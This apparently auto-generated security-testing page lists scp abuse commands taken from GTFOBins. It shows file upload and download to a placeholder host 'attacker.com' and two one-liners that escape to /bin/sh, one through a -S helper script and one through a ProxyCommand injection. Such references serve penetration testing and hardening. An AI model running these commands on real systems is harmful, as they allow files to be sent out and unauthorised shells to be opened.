---
parsed_by: focuslocust
source: commands
type: generated
---
# scp Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## scp

Tool page: [scp](../../tools/linux/scp.md)

### download

```text
scp user@attacker.com:/path/to/input-file /path/to/output-file
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/scp` |
| Evidence | Function example preserved from source parser. |

### shell

```text
echo 'exec /bin/sh 0<&2 1>&2' >/path/to/temp-file
chmod +x /path/to/temp-file
scp -S /path/to/temp-file x x:
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/scp` |
| Evidence | Function example preserved from source parser. |

### shell

```text
scp -o 'ProxyCommand=;/bin/sh 0<&2 1>&2' x x:
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/scp` |
| Evidence | Function example preserved from source parser. |

### upload

```text
scp /path/to/input-file user@attacker.com:/path/to/output-file
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/scp` |
| Evidence | Function example preserved from source parser. |
